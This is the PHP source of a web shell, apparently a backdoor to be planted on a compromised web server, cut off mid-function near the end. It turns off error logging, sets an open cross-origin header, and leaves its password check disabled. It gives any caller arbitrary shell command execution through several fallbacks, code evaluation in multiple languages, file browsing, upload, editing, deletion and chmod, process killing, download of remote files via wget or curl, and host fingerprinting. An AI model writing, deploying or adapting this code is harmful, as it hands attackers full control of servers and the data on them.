<?php
@set_time_limit(0);
@ini_set('html_errors','0');
@clearstatcache();
define('DS', DIRECTORY_SEPARATOR);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
error_reporting(0);
@ini_set('display_errors','0');
@ini_set('log_errors','0');
// clean magic quotes
$_POST = clean($_POST);
$_GET = clean($_GET);
$_COOKIE = clean($_COOKIE);
$_GP = array_merge($_POST, $_GET);
$_GP = array_map("ru", $_GP);
if(isset($_SERVER["CONTENT_TYPE"]) && $_SERVER["CONTENT_TYPE"] == 'application/json'){
  $_GP = array_merge($_GP,json_decode(file_get_contents('php://input'), true));
}
if(isset($_GP['b64info'])){
  $_GP = array_merge($_GP,json_decode(base64_decode($_GP['b64info']), true));
}
$GLOBALS['is_cli'] = false;
if(isset($argv) && isset($argv[1])){
  $p = base64_decode($argv[1]);
  $global = isset($argv[2]) ? json_decode(base64_decode($argv[2]), true) : array();
  foreach($global as $g => $v){
    if(strpos($g, "SERVER_") !== false){
      $_SERVER[substr($g,7,strlen($g))] = $v;
    }else{ $GLOBALS[$g] = $v;}
  }
  $_GP = array_merge($_GP,json_decode(base64_decode($argv[1]), true));
  $GLOBALS['is_cli'] = true;
}
$GLOBALS['pass'] = 'c13e4052213efdd9d9d9879227c09ba2224faccb';
$GLOBALS['is_b64'] = isset($_GP['isb64']) ? $_GP['isb64'] : false;
$GLOBALS['is_auth'] = false;
$GLOBALS['enable_auth'] = false;
$GLOBALS['self_url'] = self_url();
$s_debug = isset($_GP['debug']) ? $_GP['debug']:false;
if($s_debug){
  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
  @ini_set('display_errors','1');
  @ini_set('log_errors','1');
}
if(isset($_GP['login'])){
  $s_login = kript($_GP['login']);
  if(strtolower(trim($GLOBALS['pass'])) == $s_login){
    setcookie("_gPdash", $s_login, time() + (3600 * 24 * 365));
    $GLOBALS['is_auth'] = true;
  }
}elseif(isset($_COOKIE['_gPdash'])){
  if(strtolower(trim($GLOBALS['pass'])) == strtolower(trim($_COOKIE['_gPdash']))) $GLOBALS['is_auth'] = true;
}
elseif(isset($_SERVER['HTTP_X_API_PASS'])){
  if(strtolower(trim($GLOBALS['pass'])) == strtolower(trim($_SERVER['HTTP_X_API_PASS']))) $GLOBALS['is_auth'] = true;
}
elseif(isset($_GP['xpass'])){
  if(strtolower(trim($GLOBALS['pass'])) == strtolower(trim($_GP['xpass']))) $GLOBALS['is_auth'] = true;
}
if($GLOBALS['enable_auth'] && !$GLOBALS['is_auth']){
  die();
}
function var_software(){
  return getenv("SERVER_SOFTWARE");
}
function var_system(){
  return php_uname();
}
function is_win(){
  return (strtolower(substr(var_system(),0,3)) == "win")? true : false;
}
function is_posix(){
  return (function_exists("posix_getpwuid"))? true : false;
}
// magic quote and shit :-p
function clean($arr){
  $quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
  if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
    if(is_array($arr)){
      foreach($arr as $k=>$v){
        if(is_array($v)) $arr[$k] = clean($v);
        else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
      }
    }
  }
  return $arr;
}
// htmlspecialchars
function hss($s_t){
  //$s_s = htmlspecialchars($s_s, 8);
  return htmlspecialchars($s_t, 2 | 1);
}
// function raw urldecode
function ru($str){
  return (is_array($str))? array_map("rawurldecode", $str):rawurldecode($str);
}
// encode link, htmlspecialchars and rawurlencode
function pl($str){
  return hss(rawurlencode($str));
}
// add quotes
function pf($f){
  return "\"".$f."\"";
}
// replace spaces with underscore ( _ )
function cs($s_t){
  return str_replace(array(" ", "\"", "'"), "_", $s_t);
}
// trim and urldecode
function ss($s_t){
  return rawurldecode($s_t);
}
// encryption for shell password
function kript($plain){
  return sha1(md5($plain));
}
// function read file
function fgc($file){
  return file_get_contents($file);
}
if(!function_exists('read_file')){
  function read_file($file){
    $content = false;
    if($fh = fopen($file, "rb")){
      $content = "";
      while(!feof($fh)){
        $content .= fread($fh, 8192);
      }
    }
    return $content;
  }
}
if(!function_exists('raw_read_file')){
  function raw_read_file($file, $prehss = false){
    $content = @read_file($file);
    $content = (content_is_binary($content) && $prehss ? $content : hss(wordwrap($content,160,"\n",true)));
    if($prehss){
      return '<pre style="font-size:11px">'.$content.'</pre>';
    }
    return $content;
  }
}
// format bit
function ts($s_s){
  if($s_s<=0) return 0;
  $s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
  $s_e = floor(log($s_s)/log(1024));
  return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
// get file size
function gs($s_f){
  $s_s = @filesize($s_f);
  if($s_s !== false){
    if($s_s<=0) return 0;
    return ts($s_s);
  }
  else return "???";
}
// get file permissions
function gp($s_f){
  if($s_m = @fileperms($s_f)){
    $s_p = 'u';
    if(($s_m & 0xC000) == 0xC000)$s_p = 's';
    elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
    elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
    elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
    elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
    elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
    elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
    $s_p .= ($s_m & 00400)? 'r':'-';
    $s_p .= ($s_m & 00200)? 'w':'-';
    $s_p .= ($s_m & 00100)? 'x':'-';
    $s_p .= ($s_m & 00040)? 'r':'-';
    $s_p .= ($s_m & 00020)? 'w':'-';
    $s_p .= ($s_m & 00010)? 'x':'-';
    $s_p .= ($s_m & 00004)? 'r':'-';
    $s_p .= ($s_m & 00002)? 'w':'-';
    $s_p .= ($s_m & 00001)? 'x':'-';
    return $s_p;
  }
  else return "???????????";
}
function content_is_binary($content){
  if(function_exists('mb_check_encoding')){
    return !mb_check_encoding($content, 'UTF-8');
  }
  return preg_match('~[^\x20-\x7E\t\r\n]~', $content) > 0;
}
// addslashes if on windows
function adds($s_s){
  return (is_win())? addslashes($s_s):$s_s;
}
// add slash to the end of given path
function cp($s_p){
  if(@is_dir($s_p)){
    $s_x = DS;
    while(substr($s_p, -1) == $s_x) $s_p = rtrim($s_p, $s_x);
    return (is_win())? preg_replace("/\\\\+/is", "\\", $s_p.$s_x):$s_p.$s_x;
  }
  return $s_p;
}
// check shell permission to access program
function check_access($s_lang){
  $s_s = false;
  $ver = "";
  switch($s_lang){
    case "python":
      $s_cek = strtolower(exe("python -h"));
      if(strpos($s_cek,"usage")!==false) $ver = exe("python -V");
      break;
    case "perl":
      $s_cek = strtolower(exe("perl -h"));
      if(strpos($s_cek,"usage")!==false) $ver = exe("perl -e \"print \$]\"");
      break;
    case "ruby":
      $s_cek = strtolower(exe("ruby -h"));
      if(strpos($s_cek,"usage")!==false) $ver = exe("ruby -v");
      break;
    case "node":
      $s_cek = strtolower(exe("node -h"));
      if(strpos($s_cek,"usage")!==false) $ver = exe("node -v");
      break;
    case "nodejs":
      $s_cek = strtolower(exe("nodejs -h"));
      if(strpos($s_cek,"usage")!==false) $ver = exe("nodejs -v");
      break;
    case "gcc":
      $s_cek = strtolower(exe("gcc --help"));
      if(strpos($s_cek,"usage")!==false){
        $s_ver = exe("gcc --version");
        $s_ver = explode("\n",$s_ver);
        if(count($s_ver)>0) $ver = $s_ver[0];
      }
      break;
    case "tar":
      $s_cek = strtolower(exe("tar --help"));
      if(strpos($s_cek,"usage")!==false){
        $s_ver = exe("tar --version");
        $s_ver = explode("\n",$s_ver);
        if(count($s_ver)>0) $ver = $s_ver[0];
      }
      break;
    case "java":
      $s_cek = strtolower(exe("java -help"));
      if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("java -version"));
      break;
    case "javac":
      $s_cek = strtolower(exe("javac -help"));
      if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("javac -version"));
      break;
    case "wget":
      $s_cek = strtolower(exe("wget --help"));
      if(strpos($s_cek,"usage")!==false){
        $s_ver = exe("wget --version");
        $s_ver = explode("\n",$s_ver);
        if(count($s_ver)>0) $ver = $s_ver[0];
      }
      break;
    case "lwpdownload":
      $s_cek = strtolower(exe("lwp-download --help"));
      if(strpos($s_cek,"usage")!==false){
        $s_ver = exe("lwp-download --version");
        $s_ver = explode("\n",$s_ver);
        if(count($s_ver)>0) $ver = $s_ver[0];
      }
      break;
    case "lynx":
      $s_cek = strtolower(exe("lynx --help"));
      if(strpos($s_cek,"usage")!==false){
        $s_ver = exe("lynx -version");
        $s_ver = explode("\n",$s_ver);
        if(count($s_ver)>0) $ver = $s_ver[0];
      }
      break;
    case "curl":
      $s_cek = strtolower(exe("curl --help"));
      if(strpos($s_cek,"usage")!==false){
        $s_ver = exe("curl --version");
        $s_ver = explode("\n",$s_ver);
        if(count($s_ver)>0) $ver = $s_ver[0];
      }
      break;
    default:
      return false;
  }
  if(!empty($ver)) $s_s = $ver;
  return $s_s;
}
// shell command
function exe($code){
  $output = "";
  $code = $code." 2>&1";

  if(is_callable('system') && function_exists('system')){
    ob_start();
    @system($code);
    $output = ob_get_contents();
    ob_end_clean();
    if(!empty($output)) return $output;
  }
  elseif(is_callable('shell_exec') && function_exists('shell_exec')){
    $output = @shell_exec($code);
    if(!empty($output)) return $output;
  }
  elseif(is_callable('exec') && function_exists('exec')){
    @exec($code,$res);
    if(!empty($res)) foreach($res as $line) $output .= $line;
    if(!empty($output)) return $output;
  }
  elseif(is_callable('passthru') && function_exists('passthru')){
    ob_start();
    @passthru($code);
    $output = ob_get_contents();
    ob_end_clean();
    if(!empty($output)) return $output;
  }
  elseif(is_callable('proc_open') && function_exists('proc_open')){
    $desc = array(
      0 => array("pipe", "r"),
      1 => array("pipe", "w"),
      2 => array("pipe", "w"));
    $proc = @proc_open($code, $desc, $pipes, getcwd(), array());
    if(is_resource($proc)){
      while($res = fgets($pipes[1])){
        if(!empty($res)) $output .= $res;
      }
      while($res = fgets($pipes[2])){
        if(!empty($res)) $output .= $res;
      }
    }
    @proc_close($proc);
    if(!empty($output)) return $output;
  }
  elseif(is_callable('popen') && function_exists('popen')){
    $res = @popen($code, 'r');
    if($res){
      while(!feof($res)){
        $output .= fread($res, 2096);
      }
      pclose($res);
    }
    if(!empty($output)) return $output;
  }
  return "";
}
// delete dir and all of its content (no warning !) xp
function rmdirs($s){
  if(!$s) return;
  $s = (substr($s,-1)=='/')? $s:$s.'/';
  if($dh = opendir($s)){
    while(($f = readdir($dh))!==false){
      if(($f!='.')&&($f!='..')){
        $f = $s.$f;
        if(@is_dir($f)) rmdirs($f);
        else @unlink($f);
      }
    }
    closedir($dh);
    @rmdir($s);
  }
}
function copys($s,$d,$c=0){
  if($dh = opendir($s)){
    if(!@is_dir($d)) @mkdir($d);
    while(($f = readdir($dh))!==false){
      if(($f!='.')&&($f!='..')){
        $to = $d.DS.$f;
        if(@is_dir($s.DS.$f)) copys($s.DS.$f,$to);
        else{
          if(!file_exists($to))
          copy($s.DS.$f,$d.DS.$f);
        }
      }
    }
    closedir($dh);
  }
}
// get array of all files from given directory
function getallfiles($s_dir){
    $s_f = glob($s_dir.'{,.}[!.,!..]*',GLOB_BRACE);
  for($s_i = 0; $s_i<count($s_f); $s_i++){
    if(@is_dir($s_f[$s_i])){
      $s_a = glob($s_f[$s_i].DS.'*');
      if(is_array($s_f) && is_array($s_a)) $s_f = array_merge($s_f, $s_a);
    }
  }
    return $s_f;
}
// download file from internet
function dlfile($s_u,$s_p){

  if(!preg_match("/[a-z]+:\/\/.+/",$s_u)) return false;
  $s_n = basename($s_u);

  // try using php functions
  if($s_t = @fgc($s_u)){

    if(@is_file($s_p)) unlink($s_p);
    if($s_f = fopen($s_p,"w")){
      fwrite($s_f, $s_t);
      fclose($s_f);
      if(@is_file($s_p)) return true;
    }
  }

  $s_access = array("wget", "lwpdownload", "lynx", "curl");
  foreach($s_access as $s){
    $$s = check_access($s);
  }

  // using wget
  if($wget){
    $buff = exe("wget ".$s_u." -O ".$s_p);
    if(@is_file($s_p)) return true;
  }
  // try using curl
  if($curl){
    $buff = exe("curl ".$s_u." -o ".$s_p);
    if(@is_file($s_p)) return true;
  }
  // try using lynx
  if($lynx){
    $buff = exe("lynx -source ".$s_u." > ".$s_p);
    if(@is_file($s_p)) return true;
  }
  // try using lwp-download
  if($lwpdownload){
    $buff = exe("lwp-download ".$s_u." ".$s_p);
    if(@is_file($s_p)) return true;
  }
  return false;
}

function geol($str){
  $nl = PHP_EOL;
  if(preg_match("/\r\n/", $str, $r)) $nl = "\r\n";
  else{
    if(preg_match("/\n/", $str, $r)) $nl = "\n";
    elseif(preg_match("/\r/", $str, $r)) $nl = "\r";
  }
  return bin2hex($nl);
}
// find writable dir
function get_writabledir(){
  if(!$s_d = getenv("TEMP")) if(!$s_d = getenv("TMP")) if(!$s_d = getenv("TMPDIR")){
    if(@is_writable("/tmp")) $s_d = "/tmp/";
    else if(@is_writable(".")) $s_d = ".".DS;
  }
  return cp($s_d);
}
// zip function
function zip($s_srcarr, $s_dest){
  if(!extension_loaded('zip')) return false;
  if(class_exists("ZipArchive")){
    $s_zip = new ZipArchive();
    if(!$s_zip->open($s_dest, 1)) return false;

    if(!is_array($s_srcarr)) $s_srcarr = array($s_srcarr);
    foreach($s_srcarr as $s_src){
      $s_src = str_replace('\\', '/', $s_src);
      if(@is_dir($s_src)){
        $s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
        foreach($s_files as $s_file){
          $s_file = str_replace('\\', '/', $s_file);
          if(in_array(substr($s_file, strrpos($s_file, '/')+1), array('.', '..'))) continue;
          if (@is_dir($s_file)===true)	$s_zip->addEmptyDir(str_replace($s_src.'/', '', $s_file.'/'));
          else if (@is_file($s_file)===true) $s_zip->addFromString(str_replace($s_src.'/', '', $s_file), @fgc($s_file));
        }
      }
      elseif(@is_file($s_src) === true) $s_zip->addFromString(basename($s_src), @fgc($s_src));
    }
    $s_zip->close();
    return true;
  }
}
function _res_output($data, $headers = array()){
  foreach($headers as $header){
    header($header);
  }
  if($GLOBALS['is_cli']){    
    $data = is_array($data) ? json_encode($data) : $data;
    $data = base64_encode($data);
    return json_encode(array('_headers'=>$headers, '_data'=>$data));
  }
  if(is_array($data) || is_object($data)){
    try{
      $flags = defined("JSON_INVALID_UTF8_SUBSTITUTE")?JSON_INVALID_UTF8_SUBSTITUTE:0;
      $data = json_encode($data, $flags);
    }catch(Exception $e){
      $data = json_encode(array('success'=>'false', 'data'=>array()));
    }
    if($GLOBALS['is_b64']){
      $data = base64_encode($data);
    }
  }
  return $data;
}
function self_url(){
  if(isset($GLOBALS['fix_self_url'])){
    return $GLOBALS['fix_self_url'];
  }
  return sprintf(
    '%s://%s%s',
    isset($_SERVER['HTTPS']) ? 'https' : 'http',
    $_SERVER['HTTP_HOST'],
    $_SERVER['SCRIPT_NAME']
  );
}
function res_item_path($f, $type_res = 'file'){
  $f = str_replace('\\', '/', $f);
  $is_dir = is_dir($f);
  if($type_res === 'tree'){
    return array(
      'id'=>$f,
      'name'=>basename($f),
      'leaf'=>!$is_dir
    );
  }
  $data = array(
    'id'=>$f,
    'name'=>basename($f),
    'parent'=>str_replace('\\', '/',dirname($f)),
    'size' => "",
    'perms'=>gp($f),
    'perms_num'=>substr(sprintf('%o', fileperms($f)), -4),
    'mime'=>'-',
    'last_modified'=>@filemtime($f),
    'leaf'=>!$is_dir
  );
  if(!is_win() && is_posix()){
    $uid = @fileowner($f);
    $gid = @filegroup($f);
    $s_name = @posix_getpwuid($uid);
    $s_group = @posix_getgrgid($gid);
    $data['owner'] = $s_name['name'].":".$s_group['name'];
    $data['owner_id'] = $uid.":".$gid;
  }
  if($is_dir) {
    $data['name'] = ''.$data['name'].'';
    $data['type'] = 'dir';
  }
  else{
    $data['size_format'] = gs($f);
    $data['size'] = @filesize($f);
    $data['type'] = 'file';

    if($type_res === 'viewer'){
      $data['mime'] = @mime_content_type($f);
      $data['is_multimedia'] = false;
      $data['is_embed'] = false;
      $data['is_binary'] = false;
      $prefix_mime_multimedia = array('image/', 'video/', 'audio/');
      $prefix_mime_embed = array('application/pdf');
      foreach($prefix_mime_multimedia as $pma){
        if(strpos($data['mime'], $pma) !== false){
          if($data['size'] !== 0)
            $data['is_multimedia'] = true;
          continue;
        }
      }
      foreach($prefix_mime_embed as $pma){
        if(strpos($data['mime'], $pma) !== false){
          if($data['size'] !== 0)
            $data['is_embed'] = true;
          continue;
        }
      }
      $data['last_modified'] = @filemtime($f);
      $data['created_time'] = @filectime($f);
      $data['last_access_time'] = @fileatime($f);
      $data['readable'] = @is_readable($f);
      $data['writable'] = @is_writable($f);
      // $data['content'] = @read_file($f);
      // if(strpos($data['mime'], 'text/') !== false){
      //   $data['content'] = @read_file($f);
      // }
      if($data['is_multimedia']){
        // 5mb
        if($data['size'] > (5*1024)*1024){
          $data['content'] = $GLOBALS['self_url'].'?vembed='.$f;
        }else{
          $data['content'] = "data:".$data['mime'].";base64,".base64_encode(read_file($f));
        }
      }
      elseif($data['is_embed']){
        $data['content'] = $GLOBALS['self_url'].'?vembed='.$f;
      }
      else{
        $data['content'] = @read_file($f);
        if(content_is_binary($data['content'])){
          $data['is_binary'] = true;
          if($data['size'] > (5*1024)*1024){
            $data['content'] = "";
          }
        }
      }
    }
    if($data['content']){
      $data['content'] = base64_encode($data['content']);
    }
  }
  return $data;
}
function res_files_glob($path){
  $path = rtrim($path,'/')."/";
  $globs = @glob($path.'{,.}[!.,!..]*',GLOB_BRACE);
  $s_files = $s_dirs = array();
  foreach($globs as $f){
    if(@is_dir($f)) {
      $s_dirs[$f] = res_item_path($f);
    }
    else{
      $s_files[$f] = res_item_path($f);
    }
  }
  ksort($s_dirs);
  ksort($s_files);
  $lists = array_merge($s_dirs,$s_files);
  return array_values($lists);
}
function res_files($path, $type_res = 'file'){
  $path = rtrim($path,DS)."/";
  $s_files = $s_dirs = array();
  if($s_dh = @opendir($path)){
    while($f = @readdir($s_dh)){
      if($f === '.' || $f==='..') continue;
      $f = $path.$f;
      if(@is_dir($f)){
        $s_dirs[$f] = res_item_path($f,$type_res);
      }
      elseif(@is_file($f)){
        $s_files[$f] = res_item_path($f,$type_res);
      }
    }
    closedir($s_dh);
  }
  ksort($s_dirs);
  ksort($s_files);
  $lists = array_merge($s_dirs,$s_files);
  return array_values($lists);
}

if(!function_exists('get_drives')){
  function get_drives(){
    $drives = "";
    foreach (range("A", "Z") as $letter){
      if(@is_readable($letter.":\\")){
        $drives .= "$letter:|";
      }
    }
    if(!$drives) return array();
    return explode("|",rtrim($drives, "|"));
  }
}


class Acts{
  static function init($acts){
    $acts = is_array($acts) ? $acts : json_decode($acts, true);
    $actsClass = new Acts();
    $res = array();
    foreach($acts as $index => $act){
      $method = $act[0];
      $params = $act[1];
      if(method_exists($actsClass, $method)){
        $res[$index] = @call_user_func(array($actsClass, $method), $params);
      }
    }
    return $res;
  }
  function _msg($section, $status, $msg){
    if(is_bool($status)){
      $status = $status ? 'ok' : 'err';
    }
    return '[act]['.$section.']['.$status.']: '.$msg;
  }
  function delete($params){
    extract($params);
    if(isset($path)){
      if(@is_file($path)){
        unlink($path);
      }
      elseif(@is_dir($path)){
        rmdirs($path);
      }
      return $this->_msg('delete', !file_exists($path), $path);
    }
  }
  function deletes($params){
    extract($params);
    $result = array();
    if(isset($paths)){
      foreach($paths as $path){
        $result[] = $this->delete(array('path'=>$path));
      }
    }
    return $result;
  }
  function newfolder($params){
    extract($params);
    if(isset($path)){
      return $this->_msg('newfolder', mkdir($path), $path);
    }
  }
  function newfile($params){
    extract($params);
    if(!isset($content))
      $content = '';
    if(isset($path)){
      if(file_put_contents($path, $content)){
        return $this->_msg('newfile', true, $path);
      }else{
        return $this->_msg('newfile', false, $path);
      }
    }
  }
  function rename($params){
    extract($params);
    if(isset($from) && isset($to)){
      $status = rename($params['from'],$params['to']);
      return $this->_msg('rename', $status, $from.' => '.$to);
    }
  }
  function copy($params){
    extract($params);
    if(isset($path) && isset($to)){
      if(file_exists($to)) return $this->_msg('copy', false, $to.' exists');
      if(@is_dir($path)){
        copys($path,$to);
      }elseif(@is_file($path)){
        copy($path,$to);
      }
      return $this->_msg('copy', file_exists($to), $path.' => '.$to);
    }
  }
  function copys($params){
    extract($params);
    $result = array();
    if(isset($paths) && isset($to)){
      foreach($paths as $path){
        $toPath = $to.DS.basename($path);
        $result[] = $this->copy(array('path'=>$path,'to'=>$toPath));
      }
    }
    return $result;
  }
  function move($params){
    extract($params);
    if(isset($path) && isset($to)){
      if(file_exists($to)) return $this->_msg('move', 'err', $to.' exists');
      if(rename($path,$to));
      return $this->_msg('move', file_exists($to), $path.' => '.$to);
    }
  }
  function moves($params){
    extract($params);
    $result = array();
    if(isset($paths) && isset($to)){
      foreach($paths as $path){
        $toPath = $to.DS.basename($path);
        $result[] = $this->move(array('path'=>$path, 'to'=>$toPath));
      }
    }
    return $result;
  }
  function chmod($params){
    extract($params);
    $result = array();
    if(isset($paths) && isset($mod)){
      foreach($paths as $path){
        $status = chmod($path, octdec($mod));
        $result[] = $this->_msg('chmod', $status, $path.' => '.$mod);
      }
    }
    return $result;
  }
  function touch($params){
    extract($params);
    $result = array();
    if(isset($paths) && isset($date)){
      $date = strtotime($date);
      foreach($paths as $path){
        $status = touch($path, $date);
        $result[] = $this->_msg('touch', $status, $path.' => '.$mod);
      }
    }
    return $result;
  }

}
abstract class BaseMod{
  protected $res = array("success"=>false, "data"=>array());
  protected $headers = array();
  protected $params;
  function __construct($params) {
    $this->params = $params;
  }
  function getParam($key, $default = null){
    return isset($this->params[$key]) ? $this->params[$key] : $default;
  }
  function _sendError($msg){
    $this->res['success'] = false;
    $this->res['error'] = $msg;
  }
  function _sendData($data, $merge = array()){
    $this->res['success'] = true;
    $this->res['data'] = $data;
    $this->res = array_merge($this->res, $merge);
  }
  function _output(){
    return _res_output($this->res, $this->headers);
  }
  function _result(){
    if($acts = $this->getParam('acts')){
      $this->res['acts'] = Acts::init($acts);
    }
    $this->_process();
    return $this->_output();
  }
  abstract function _process();
}
class TreeMod extends BaseMod{
  private $id;
  function _process() {
    $this->id = $id= $this->getParam('id');
    $noChildren = intval($this->getParam('_no_children', 0));
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    if($id){
      $path = $id;
      $data = res_item_path($path,'tree');
      if($noChildren === 0){
        $data["children"] = res_files($path,'tree');
      }
      $this->_sendData($data);
    }
  }
}
class EditorMod extends BaseMod{
  function _process() {
    $path = $this->getParam('path');
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    $message = '';
    if($path){
      if(isset($p_content)){
        if(is_file($path) && !is_writable($path)){
          return $this->_sendError('File no writable.!');
        }
        $s_eol = geol($p_content);
        $s_eolf = pack("H*", geol($p_content));
        $s_eolh = pack("H*", $s_eol);
        $p_content = str_replace($s_eolf, $s_eolh, $p_content);

        if($s_filez = fopen($path,"w")){
          $s_time = @date("d-M-Y H:i:s",time());
          if(fwrite($s_filez,$p_content)!==false) $message = "File saved @ ".$s_time;
          else $message = "Failed to save";
          fclose($s_filez);
        }
        else $message = "Permission denied";
        if(!isset($p_no_return)){
          return $this->_sendData(array(), array('message'=>$message));
        }
      }
      $data = res_item_path($path, 'editor');
      return $this->_sendData($data, array('message'=>$message));
    }
  }
}
class MainMod extends BaseMod{
  function _process(){
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    if(isset($p_cwd)){
      chdir($p_cwd);
    }
    if(isset($p_cwdb64)){
      chdir(base64_decode($p_cwdb64));
    }
    if(isset($p_exe)){
      return $this->_sendData(hss(exe($p_exe)));
    }elseif(isset($p_exb64)){
      return $this->_sendData(hss(exe(base64_decode($p_exb64))));
    }elseif(isset($p_ac) && method_exists($this, '__ac_'.$p_ac)){
      return @call_user_func(array($this, '__ac_'.$p_ac));
    }elseif(isset($p_eval)){
      $res = hss($this->__eval($p_eval, $this->getParam('lang', 'php'), $this->getParam('args', '')));
      return $this->_sendData($res);
    }elseif(isset($p_evb64)){
      $res = hss($this->__eval(base64_decode($p_evb64), $this->getParam('lang', 'php'), $this->getParam('args', '')));
      return $this->_sendData($res);
    }elseif(isset($p_vf)){
      if(file_exists($p_vf)){
        echo raw_read_file($p_vf, true);
      }
      die();
    }elseif(isset($p_vfb64)){
      if(file_exists($p_vfb64)){
        echo raw_read_file(base64_decode($p_vfb64), true);
      }
      die();
    }
    else{

    }
  }
  function __ac_info(){
    $programs_lists = array("python", "perl", "ruby", "node", "nodejs", "gcc", "java", "javac", "tar", "wget", "lwpdownload", "lynx", "curl");
    $eval_lists = array("python", "perl", "ruby", "node", "nodejs", "gcc", "java", "javac");
    $programs_available = array("php");
    $eval_available = array("php");
    foreach($programs_lists as $p){
      $c= check_access($p);
      if($c){
        $programs_available[] = $p;
        if(in_array($p, $eval_lists)){
          $eval_available[] = $p;
        }
      }

    }
    $data = array(
      "system"=>var_system(),
      "software"=>var_software(),
      "is_win"=>is_win(),
      "whoami"=>exe('whoami'),
      "php_current_user"=>get_current_user(),
      "php_version"=>phpversion(),
      "server_time"=>@date("d M Y H:i:s",time()),
      "server_addr"=>isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"],
      "client_addr"=>$_SERVER['REMOTE_ADDR'],
      "http_host"=>$_SERVER["HTTP_HOST"],
      'root_path'=> is_win() ? str_replace('\\','/',realpath($_SERVER['DOCUMENT_ROOT'])) :'/',
      'document_root'=>str_replace('\\','/',realpath($_SERVER['DOCUMENT_ROOT'])),
      "script_path"=>str_replace('\\','/',realpath(dirname(__FILE__))),
      "writable_dir"=>str_replace('\\','/',realpath(get_writabledir())),
      'cpu_count'=>exe(is_win()?'echo %NUMBER_OF_PROCESSORS%':'nproc --all'),
      'directory_separator'=>DS,
      'drives'=>get_drives(),
      'programs_available'=>$programs_available,
      'eval_available'=>$eval_available
    );
    return $this->_sendData($data);
  }
  function __ac_expgrid(){
    $path = $this->getParam('path');
    if($path){
      $data = res_item_path($path);
      $data['children'] =  res_files($path);
      return $this->_sendData($data);
    }
  }
  function __ac_ps(){
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    $s_win = is_win();
    $messages = array();
    if(isset($p_kills)){
      $p_kills = explode('|', $p_kills);
      foreach($p_kills as $s_p){
        if(function_exists("posix_kill")) $messages[] = (posix_kill($s_p,'9'))? ("Oke: ".$s_p) : ("Err: ".$s_p);
        else{
          if(!$s_win) $messages[] = exe("kill -9 ".$s_p);
          else $messages[] = exe("taskkill /F /PID ".$s_p);
        }
      }
    }

    if(!$s_win) $s_h = "ps aux"; // nix
    else $s_h = "tasklist /V /FO csv"; // win
    $s_wexplode = " ";
    if($s_win) $s_wexplode = "\",\"";

    $s_res = exe($s_h);
    $data = array();
    if(trim($s_res)=='') {
      return $this->_sendError("Error getting process list");
    }
    else{
      if(!$s_win) $s_res = preg_replace('#\ +#',' ',$s_res);
      $s_psarr = explode("\n",$s_res);
      $headers = explode($s_wexplode,$s_psarr[0]);
      $headers_count = count($headers);
      foreach($s_psarr as $index => $s_psa){
        if(trim($s_psa)!=''){
          if($index === 0 ) continue;
          $s_psln = explode($s_wexplode, $s_psa, $headers_count);
          $data[] = array_combine($headers, $s_psln);
        }
      }
    }
    return $this->_sendData($data, array('message'=>$messages));
  }
  function __ac_view(){
    $path = $this->getParam('path');
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    $message = '';
    if($path){
      $data = res_item_path($path, 'viewer');
      return $this->_sendData($data, array('message'=>$message));
    }
  }
  function __ac_upload(){
    $path = $this->getParam('path');
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    $message = '';
    if($path && isset($_FILES['file'])){
      $file = $_FILES['file'];
      $name = isset($p_name) && $p_name !== '' ? $p_name : $file['name'];
      $newFilePath = cp($path).$name;
      if(is_uploaded_file($file['tmp_name'])){
        if(@move_uploaded_file($file['tmp_name'],$newFilePath)){
          $message = 'Success uploaded.';
        }else{
          return $this->_sendError('Error upload.');
        }
        return $this->_sendData(array("name"=>$name,"filePath"=>$newFilePath), array('message'=>$message));
      }
    }elseif($path && isset($p_name) && isset($p_file_content) ){
      $name = $p_name;
      $newFilePath = cp($path).$name;
      preg_match('/^data:(.+);base64,(.*)/', $p_file_content, $match);
      if(!isset($match[2])){
        return $this->_sendError('Error upload. (content null)');
      }
      if(@is_file($newFilePath)) unlink($newFilePath);
      if($s_f = fopen($newFilePath,"w")){
        fwrite($s_f, base64_decode($match[2]));
        fclose($s_f);
        if(@is_file($newFilePath)){
          return $this->_sendData(array("name"=>$name,"filePath"=>$newFilePath), array('message'=>'Success uploaded.'));
        }else{
          return $this->_sendError('Error upload.');
        }
      }
      return $this->_sendData(array(), array('message'=>$message));
    }
  }
  function __ac_upload_url(){
    $path = $this->getParam('path');
    $url = $this->getParam('url');
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    if($path && $url && isset($p_name)){
      $toPath = cp($path).$p_name;
      if(dlfile($url, $toPath)){
        return $this->_sendData(array(), array('message'=>'Success upload from '.$url.' to '.$toPath));
      }else{
        return $this->_sendError('Error upload from '.$url);
      }
    }
  }
  function __ac_proxy_dash(){
    $url = $this->getParam('url');
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    if($url){
      $opts = array(
        'http' => array(
          'method'  => 'POST',
          'header'  => 'Content-Type: application/json',
          'content' => $p_params
        ),
        "ssl"=>array(
            "verify_peer"=>false,
            "verify_peer_name"=>false,
        ),
      );
      $context = stream_context_create($opts);
      $result = file_get_contents($url, false, $context);
      $res = json_decode($result, true);
      if(!$res){
        if(isset($http_response_header)){
          foreach($http_response_header as $index => $header){
              header($header);
